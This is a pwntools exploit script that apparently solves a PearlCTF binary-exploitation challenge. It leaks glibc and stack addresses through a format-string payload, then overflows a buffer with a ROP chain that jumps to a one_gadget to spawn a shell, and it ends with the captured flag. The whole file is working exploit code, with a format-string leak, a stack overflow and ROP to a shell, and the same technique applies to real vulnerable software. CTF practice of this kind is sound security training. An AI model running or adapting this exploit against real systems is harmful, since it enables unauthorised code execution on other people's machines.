from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

environ = {
    'LD_PRELOAD': os.path.join(os.getcwd(), './libc.so.6'), 
    'LD_LIBRARY_PATH': os.path.join(os.getcwd(), './')
}

gs='''
continue
'''

p = gdb.debug('./chall_patched', env=environ, gdbscript=gs)

# p = remote('mr---ropot.ctf.pearlctf.in', 30009)

p.sendline(b'1')
p.sendlineafter(b'Did you like the joke? Leave a response: \n', b'%1$p%9$p')
p.recvuntil(b'Your Response:\n')
leaks = p.recvline().strip().decode()
glibc_base_addr = int(leaks[0:14], 16)-0x204643
log.info(f'glibc base addr: {hex(glibc_base_addr)}')
stack_addr = int(leaks[14:30], 16)
log.info(f'stack addr: {hex(stack_addr)}')

glibc_r = ROP('./libc.so.6')
chain = [
    glibc_r.rbx.address+glibc_base_addr,
    0x0,
    glibc_r.r12.address+glibc_base_addr,
    0x0,
    0xef4ce+glibc_base_addr
]

p.sendline(b'2')
p.sendlineafter(b'Did you like the fact? Leave a response: \n', b'A'*0x30+p64(stack_addr+0x48)+b''.join([p64(c) for c in chain]))

p.interactive()

# pearl{fin4lly_g0t_my_fl4g_th4nks_printf}